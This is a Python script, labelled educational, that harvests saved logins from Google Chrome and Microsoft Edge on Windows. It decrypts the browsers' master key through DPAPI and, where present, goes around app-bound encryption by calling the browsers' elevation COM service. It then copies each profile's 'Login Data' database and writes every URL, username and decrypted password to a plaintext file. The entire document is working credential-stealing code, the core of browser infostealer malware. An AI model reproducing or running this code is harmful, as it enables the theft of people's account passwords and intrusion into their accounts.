#Made entirely for educational purposes - works only on Chrome version < 126.x

import os
import json
import base64
import sqlite3
import shutil
import time
from pathlib import Path

import win32crypt                       # pip install pywin32
from Crypto.Cipher import AES            # pip install pycryptodome

# ------------------------------------------------------------
# 1. Decrypt the master key (old DPAPI + App-Bound via COM)
# ------------------------------------------------------------
def get_master_key(user_data_path: Path, browser_type: str):
    local_state = user_data_path / "Local State"
    if not local_state.exists():
        print(f"  [!] Local State not found: {local_state}")
        return None

    with open(local_state, "r", encoding="utf-8") as f:
        state = json.load(f)

    enc_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
    if not enc_key_b64:
        print("  [!] No encrypted_key in Local State")
        return None

    enc_key = base64.b64decode(enc_key_b64)
    if not enc_key.startswith(b"DPAPI"):
        print("  [!] Unexpected encrypted_key prefix")
        return None
    enc_key = enc_key[5:]

    # Step 1: DPAPI decrypt
    try:
        decrypted = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"  [!] DPAPI decryption failed: {e}")
        return None

    # Old style: key is exactly 32 bytes
    if len(decrypted) == 32:
        return decrypted

    # New style: App-Bound Encryption → use browser COM service
    print("  [*] App-Bound Encryption detected, calling browser COM service...")
    return decrypt_via_com(decrypted, browser_type)

def decrypt_via_com(encrypted_key_blob: bytes, browser_type: str):
    try:
        import win32com.client
    except ImportError:
        print("  [!] win32com.client not available. Install pywin32.")
        return None

    clsid_map = {
        "chrome": "{708860E0-F641-4611-8895-7D867DD3675B}",
        "edge":   "{1FCBE96C-1697-43AF-9140-2897C7C69767}"
    }
    clsid = clsid_map.get(browser_type.lower())
    if not clsid:
        print(f"  [!] Unknown browser type: {browser_type}")
        return None

    try:
        elevator = win32com.client.Dispatch(clsid)
        input_b64 = base64.b64encode(encrypted_key_blob).decode("ascii")
        output_b64 = elevator.DecryptData(input_b64)
        return base64.b64decode(output_b64)
    except Exception as e:
        print(f"  [!] COM elevation failed: {e}")
        return None

# ------------------------------------------------------------
# 2. Password decryption (AES-GCM or old DPAPI)
# ------------------------------------------------------------
def decrypt_password(encrypted_bytes: bytes, master_key: bytes):
    if len(encrypted_bytes) == 0:
        return ""

    # AES-GCM (prefix "v10")
    if encrypted_bytes.startswith(b"v10") and len(encrypted_bytes) >= 3 + 12 + 16:
        try:
            nonce = encrypted_bytes[3:15]
            ciphertext = encrypted_bytes[15:-16]
            tag = encrypted_bytes[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode()
        except Exception:
            pass

    # Old DPAPI fallback
    try:
        return win32crypt.CryptUnprotectData(encrypted_bytes, None, None, None, 0)[1].decode()
    except Exception:
        return "<decryption failed>"

# ------------------------------------------------------------
# 3. Copy database safely (retry once if file is invalid)
# ------------------------------------------------------------
def copy_login_db(src: Path, dst: Path):
    """Copy the database file and return True if it's a valid SQLite DB."""
    # Try up to two times
    for attempt in range(2):
        shutil.copy2(src, dst)
        # Quick check if it's a valid SQLite database (header starts with "SQLite format 3\0")
        try:
            with open(dst, "rb") as f:
                header = f.read(16)
            if header.startswith(b"SQLite format 3\0"):
                return True
        except Exception:
            pass
        # If invalid, wait a bit and retry
        time.sleep(0.2)
    return False

# ------------------------------------------------------------
# 4. Extract from one browser
# ------------------------------------------------------------
def extract_from_browser(name: str, user_data_path: Path, browser_type: str):
    print(f"\n[*] Processing {name} ({user_data_path})")
    key = get_master_key(user_data_path, browser_type)
    if not key:
        print("  [!] Could not obtain master key. Skipping.")
        return []

    all_entries = []

    for profile_dir in user_data_path.iterdir():
        if not profile_dir.is_dir():
            continue
        login_db = profile_dir / "Login Data"
        if not login_db.exists():
            continue

        # Copy to unique temp file
        temp_db = os.path.join(
            os.environ["TEMP"],
            f"logindata_{profile_dir.name}_{os.getpid()}.db"
        )

        if not copy_login_db(login_db, Path(temp_db)):
            print(f"  [!] Could not copy or invalid database: {login_db}")
            try:
                os.unlink(temp_db)
            except Exception:
                pass
            continue

        # Connect and read
        conn = None
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT origin_url, username_value, password_value "
                "FROM logins ORDER BY date_created DESC"
            )
            for url, user, enc_pwd in cursor.fetchall():
                if not url or not user or not enc_pwd:
                    continue
                password = decrypt_password(enc_pwd, key)
                all_entries.append((url, user, password))
            cursor.close()
        except sqlite3.DatabaseError as e:
            print(f"  [!] Database error in {login_db}: {e}")
        except Exception as e:
            print(f"  [!] Unexpected error: {e}")
        finally:
            if conn:
                conn.close()
            # Delete temp file, ignore errors
            try:
                os.unlink(temp_db)
            except PermissionError:
                # File still locked – try to delete after a short delay
                time.sleep(0.5)
                try:
                    os.unlink(temp_db)
                except Exception:
                    print(f"  [!] Warning: could not delete temp file {temp_db}")

    return all_entries

# ------------------------------------------------------------
# 5. Main
# ------------------------------------------------------------
def main():
    browsers = {
        "Google Chrome": (
            Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data",
            "chrome"
        ),
        "Microsoft Edge": (
            Path(os.environ["LOCALAPPDATA"]) / "Microsoft" / "Edge" / "User Data",
            "edge"
        ),
    }

    # Place the output file in the same directory as this script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_file = os.path.join(script_dir, "passwords.txt")

    with open(output_file, "w", encoding="utf-8") as out:
        out.write("Browser Password Extraction\n")
        out.write("=" * 55 + "\n\n")

        for name, (path, btype) in browsers.items():
            out.write(f"===== {name} =====\n")
            if not path.exists():
                out.write("Browser not installed or no User Data found.\n\n")
                continue

            entries = extract_from_browser(name, path, btype)
            if not entries:
                out.write("No passwords found.\n\n")
            else:
                for url, user, pwd in entries:
                    out.write(f"URL      : {url}\n")
                    out.write(f"Username : {user}\n")
                    out.write(f"Password : {pwd}\n\n")
            out.write("\n")

    print(f"\n[+] Done! Passwords saved to {output_file}")

if __name__ == "__main__":
    main()